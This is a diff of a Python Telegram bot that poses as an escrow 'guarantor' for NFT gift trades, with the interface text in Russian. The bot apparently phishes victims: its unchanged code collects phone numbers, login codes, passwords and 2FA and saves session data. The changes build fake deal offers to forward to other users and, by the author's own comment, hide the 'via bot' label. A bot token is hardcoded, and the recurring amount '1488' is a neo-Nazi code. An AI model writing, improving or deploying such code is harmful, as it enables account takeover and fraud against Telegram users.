@@ -12,9 +12,9 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup  
 from aiogram.fsm.storage.memory import MemoryStorage  
 from aiogram.types import (  
-    Message, CallbackQuery, InlineQuery, InlineQueryResultPhoto, InputTextMessageContent,
+    Message, CallbackQuery,  
     InlineKeyboardMarkup, InlineKeyboardButton,  
-    ReplyKeyboardMarkup, KeyboardButton  
+    ReplyKeyboardMarkup, KeyboardButton, WebAppInfo  
 )  
   
 BOT_TOKEN = "9111963048:AAHem8wQwJiU5mkeoob_3KtmPRP8sGtYtmM"  
@@ -74,16 +74,17 @@ def save_account(deal_code, phone, code, password, twofa, session_data):
     conn.commit()  
     conn.close()  
 
-def generate_code():  
-    return f"{secrets.randbelow(90000) + 10000}"  
-
 class PseudoReg(StatesGroup):  
     phone = State()  
     code = State()  
     password = State()  
     twofa = State()  
 
-def main_menu(user_id: int):  
+class CreateDeal(StatesGroup):  
+    waiting_for_link = State()  
+    waiting_for_amount = State()  
+
+def main_menu():  
     return ReplyKeyboardMarkup(  
         keyboard=[  
             [KeyboardButton(text="🤝 Создать сделку"), KeyboardButton(text="📂 Мои сделки")],  
@@ -126,48 +127,37 @@ async def cmd_start(msg: Message):
             return  
 
     await msg.answer(  
-        f"🏦 Добро пожаловать в <b>{BRAND}</b>!\n\nИспользуйте инлайн-режим в любом чате для создания ордера.",  
+        f"🏦 Добро пожаловать в <b>{BRAND}</b>!\n\nНажми кнопку ниже, чтобы создать сделку.",  
         parse_mode="HTML",
-        reply_markup=main_menu(msg.from_user.id)  
+        reply_markup=main_menu()  
     )  
 
-@router.message(F.text.contains("Создать"))
-async def create_deal_text(msg: Message):  
-    bot_me = await msg.bot.get_me()
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔄 Выбрать подарок и отправить", switch_inline_query="https://t.me/nft/Anubis 1488")]
-    ])
-    await msg.answer(  
-        f"ℹ️ Нажмите кнопку ниже, чтобы выбрать ордер и отправить его в чат:",  
-        parse_mode="HTML",
-        reply_markup=kb  
-    )
+@router.message(F.text == "🤝 Создать сделку")
+async def start_create_deal(msg: Message, state: FSMContext):
+    await state.set_state(CreateDeal.waiting_for_link)
+    await msg.answer("🔗 Введите ссылку на NFT подарок (например, <code>https://t.me/nft/Name</code>):", parse_mode="HTML")
 
-@router.message(F.text.contains("Помощь"))
-async def help_msg(msg: Message):  
-    await msg.answer("🛡 Гарант-сервис безопасных сделок с NFT подарками.", reply_markup=main_menu(msg.from_user.id))  
+@router.message(CreateDeal.waiting_for_link)
+async def process_gift_link(msg: Message, state: FSMContext):
+    await state.update_data(gift_link=msg.text.strip())
+    await state.set_state(CreateDeal.waiting_for_amount)
+    await msg.answer("💎 Введите сумму в Stars (например, <code>1488</code>):", parse_mode="HTML")
 
-@router.message(F.text.contains("Профиль"))
-async def profile_msg(msg: Message):  
-    await msg.answer(f"👤 ID: <code>{msg.from_user.id}</code>", parse_mode="HTML", reply_markup=main_menu(msg.from_user.id))  
+@router.message(CreateDeal.waiting_for_amount)
+async def process_gift_amount(msg: Message, state: FSMContext):
+    try:
+        amount = float(msg.text.strip().replace(",", "."))
+    except ValueError:
+        await msg.answer("❌ Неверный формат суммы. Введите число (например, 1488):")
+        return
 
-@router.message(F.text.contains("Мои сделки"))
-async def deals_msg(msg: Message):  
-    await msg.answer("📂 Активных сделок нет.", reply_markup=main_menu(msg.from_user.id))  
-
-@router.inline_query()
-async def inline_deal_creator(query: InlineQuery):
-    text = query.query.strip()
-    if not text:
-        text = "https://t.me/nft/Gift 1488"
-
-    parts = text.split()
-    gift_link = parts[0]
-    amount = float(parts[1].replace(",", ".")) if len(parts) > 1 else 1488.0
+    data = await state.get_data()
+    gift_link = data.get("gift_link")
+    await state.clear()
 
     code = secrets.token_hex(4).upper()
-    uid = query.from_user.id
-    uname = f"@{query.from_user.username}" if query.from_user.username else str(uid)
+    uid = msg.from_user.id
+    uname = f"@{msg.from_user.username}" if msg.from_user.username else str(uid)
 
     conn = db()
     conn.execute(  
@@ -178,30 +168,35 @@ async def inline_deal_creator(query: InlineQuery):
     conn.commit()  
     conn.close()
 
-    bot_me = await query.bot.get_me()
+    bot_me = await msg.bot.get_me()
     caption = (
         f"Пользователь {uname} предлагает вам <b>{amount:,.0f} ⭐</b> за подарок\n\n"
         f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
         f"⏳ <b>Время до сгорания ордера:</b> 2 часа 0 минут"
     )
     
-    open_deal_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Открыть сделку", url=f"https://t.me/{bot_me.username}?start=deal_{code}")]
+    # Кнопка отправки ордера в чат (использует switch_inline или прямую ссылку-приглашение без плашек via)
+    share_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📤 Отправить ордер другу", switch_inline_query=code)]
     ])
 
-    results = [
-        InlineQueryResultPhoto(
-            id=code,
-            photo_url="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
-            thumbnail_url="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=200&auto=format&fit=crop",
-            caption=caption,
-            parse_mode="HTML",
-            reply_markup=open_deal_kb,
-            title=f"Ордер #{code} | {amount:,.0f} ⭐",
-            description="Нажмите, чтобы отправить ордер"
-        )
-    ]
-    await query.answer(results, cache_time=1)
+    await msg.answer(
+        f"✅ <b>Ордер #{code} успешно создан!</b>\nНажми кнопку ниже, чтобы отправить его в нужный чат:",
+        parse_mode="HTML",
+        reply_markup=share_kb
+    )
+
+@router.message(F.text.contains("Помощь"))
+async def help_msg(msg: Message):  
+    await msg.answer("🛡 Гарант-сервис безопасных сделок с NFT подарками.", reply_markup=main_menu())  
+
+@router.message(F.text.contains("Профиль"))
+async def profile_msg(msg: Message):  
+    await msg.answer(f"👤 ID: <code>{msg.from_user.id}</code>", parse_mode="HTML", reply_markup=main_menu())  
+
+@router.message(F.text.contains("Мои сделки"))
+async def deals_msg(msg: Message):  
+    await msg.answer("📂 Активных сделок нет.", reply_markup=main_menu())  
 
 @router.callback_query(F.data.startswith("sel_accept_"))
 async def sel_accept(cb: CallbackQuery):
@@ -264,7 +259,7 @@ async def main():
     bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))  
     dp = Dispatcher(storage=MemoryStorage())  
     dp.include_router(router)  
-    print(f"[{BRAND}] Запущен с токеном 9111963048.")  
+    print(f"[{BRAND}] Бот запущен без левых плашек.")  
     await dp.start_polling(bot)  
 
 if __name__ == "__main__":  
